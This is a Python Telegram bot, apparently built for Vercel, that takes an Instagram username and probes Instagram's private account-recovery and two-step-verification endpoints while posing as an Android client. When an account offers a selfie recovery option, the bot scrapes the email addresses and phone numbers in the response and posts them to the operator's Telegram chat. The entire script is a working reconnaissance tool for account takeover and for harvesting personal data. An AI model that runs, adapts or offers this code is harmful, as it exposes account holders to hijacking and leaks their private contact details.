import os
import json
import re
import uuid
import random
import string
import time
import threading
import requests

# ====================== CONFIG ======================
TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not TOKEN or not CHAT_ID:
    raise Exception("Please set BOT_TOKEN and CHAT_ID in Vercel Environment Variables!")

hads = bad = erore = 0
checked = set()
lock = threading.Lock()

# ====================== CHECK FUNCTION ======================
def check_one(user):
    global hads, bad, erore
    user = user.strip().lstrip('@').lower()

    with lock:
        if user in checked:
            return
        checked.add(user)

    try:
        sess = requests.Session()
        device_id = str(uuid.uuid4())

        headers = {
            'User-Agent': 'Instagram 390.0.0.43.81 Android (33/13; 480dpi; 1080x2316; HONOR; RMO-NX1; HNRMO-Q; qcom; ar_IQ; 766920165)',
            'accept-language': 'ar-IQ, en-US',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-ig-app-id': '567067343352427',
            'x-ig-device-id': device_id,
        }

        data = {
            'params': f'{{"client_input_params":{{"is_username_or_email":1,"search_query":"{user}"}},"server_params":{{"is_from_logged_out":0,"device_id":"{device_id}"}}}}',
            'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
            'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5',
        }

        res1 = sess.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/', 
                        headers=headers, data=data, timeout=10)

        if res1.status_code == 200:
            match = re.search(r'Q-PTB[a-zA-Z0-9_\-]*\|aplrr', res1.text)
            if match:
                token = match.group(0)
                res2 = sess.post(
                    'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.ap.two_step_verification.challenge_picker/',
                    headers=headers,
                    data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}', 
                          'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
                          'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5'},
                    timeout=10
                ).text

                if 'SELFIE' in res2.upper():
                    hads += 1
                    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
                    phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)
                    msg = f"🎯 **SELFIE FOUND!**\n\n👤 @{user}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                json={"chat_id": CHAT_ID, "text": msg})
                else:
                    bad += 1
            else:
                bad += 1
        else:
            erore += 1

    except:
        erore += 1


# ====================== VERCEL REQUIRED HANDLER ======================
def handler(request):
    if request.method == "POST":
        try:
            data = request.get_json()
            if data and "message" in data:
                text = data["message"].get("text", "")
                chat_id = data["message"]["chat"]["id"]

                if text.startswith("/check "):
                    username = text.split(maxsplit=1)[1]
                    threading.Thread(target=check_one, args=(username,), daemon=True).start()
                    return {"statusCode": 200, "body": f"🔍 Checking @{username}..."}

                elif text.startswith("/stats"):
                    return {"statusCode": 200, "body": f"Selfie: {hads}\nBad: {bad}\nError: {erore}"}
        except:
            pass

    return {"statusCode": 200, "body": "ok"}


# Auto set webhook
if os.getenv("WEBHOOK_URL"):
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={os.getenv('WEBHOOK_URL')}")
    except:
        pass
